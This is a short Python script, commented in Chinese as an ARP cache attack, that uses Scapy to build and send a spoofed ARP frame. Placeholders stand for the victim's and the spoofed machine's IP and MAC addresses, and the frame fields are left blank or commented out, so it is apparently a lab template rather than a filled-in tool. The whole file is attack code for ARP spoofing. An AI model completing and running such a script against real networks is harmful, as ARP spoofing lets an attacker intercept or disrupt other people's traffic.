#! /usr/bin/python
# -*- coding: utf-8 -*-
# arp 缓存攻击
from scapy.all import *

IP_victim = ""  # 受害机的IP地址
MAC_victim = ""  # 受害机的MAC地址

IP_spoofed = ""  # 欺骗机的IP地址
MAC_spoofed = ""  # 欺骗机的MAC地址

print("SENDING SPOOFED ARP REQUEST....")

ether = Ether()
# ether.dst =  # 目的机的MAC地址
# ether.src =  # 发出机的MAC地址

arp = ARP()
# arp.psrc =  # 发出机的IP地址
# arp.pdst =  # 目的机的IP地址
# arp.op =  # 1 for request, 2 for reply， 3 for RARP request, 4 for RARP reply
frame = ether / arp
sendp(frame)
